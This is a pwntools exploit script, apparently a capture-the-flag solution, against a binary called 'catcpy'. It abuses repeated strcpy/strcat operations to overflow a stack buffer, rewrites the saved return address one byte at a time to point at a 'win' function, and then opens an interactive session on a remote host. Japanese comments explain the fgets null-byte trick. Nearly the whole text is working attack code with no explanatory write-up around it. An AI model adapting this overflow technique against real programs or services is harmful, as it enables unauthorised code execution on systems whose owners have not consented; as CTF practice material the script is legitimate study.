from pwn import *
elf_file = FILENAME = './catcpy'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log



HOST = b'34.170.146.252' 
POST = 32346
#libc = ELF(b"./libc.so.6")
'''
HOST = b'localhost'
POST = 7777
libc = ELF(b"./libc.so.6")
#libc = ELF(b"./libc6-amd64_2.27-3ubuntu1_i386/data/lib64/libc.so.6")
'''
if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  c = gdb.debug(FILENAME,gdbscript='''b *main+0xe7''')

def strcpy():
    c.sendlineafter(">","1")

def strcat():
    c.sendlineafter(">","2")

strcpy()

payload  = b''
payload += b'b' * (0x22)
c.sendlineafter(b"Data:",payload)
strcat()

payload  = b'a'*(0xff-0x8)
payload += p64(0x401256)
c.sendafter(b"Data:",payload)
#fgets(size)は通常改行コードで入力終わって\x00を付け足す
#size-1まで入力すると即\x00を付け足すため、アドレスが書きやすくなる

#return_add: 0x0000004012566161
#libc_start_main+0x80があってそのままだとwin関数で上書きできない

strcpy()

payload  = b''
payload += b'b' * (0x21)
c.sendlineafter(b"Data:",payload)#

strcat()

payload  = b'a'*(0xff-0x8)
payload += p64(0x401256)
c.sendafter(b"Data:",payload)


#return_add: 0x0000000040125661

strcpy()

payload  = b''
payload += b'b' * (0x20)
c.sendlineafter(b"Data:",payload)#padding_0x20

strcat()

payload  = b'a'*(0xff-0x8)
payload += p64(0x401256)
c.sendafter(b"Data:",payload)

#return_add: 0x0000000000401256(win)

c.sendlineafter(">","goodbye")

#fire

c.interactive()
#gdb.attach(r)